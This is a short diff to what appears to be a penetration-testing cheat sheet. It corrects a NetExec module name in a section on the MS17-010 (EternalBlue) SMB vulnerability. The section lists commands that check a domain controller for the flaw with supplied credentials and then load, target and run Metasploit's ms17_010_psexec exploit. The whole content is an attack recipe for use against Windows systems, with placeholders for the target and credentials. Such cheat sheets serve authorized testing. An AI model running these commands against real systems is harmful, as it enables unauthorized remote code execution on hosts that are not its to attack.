@@ -2,7 +2,7 @@
 
 ## ms17-010
 ```
-nxc smb <dc-ip> -u <user_name> -p <user_password> -M ms17010   
+nxc smb <dc-ip> -u <user_name> -p <user_password> -M ms17-010   
 use exploit/windows/smb/ms17_010_psexec   
 set rhosts <dc-ip>   
 run
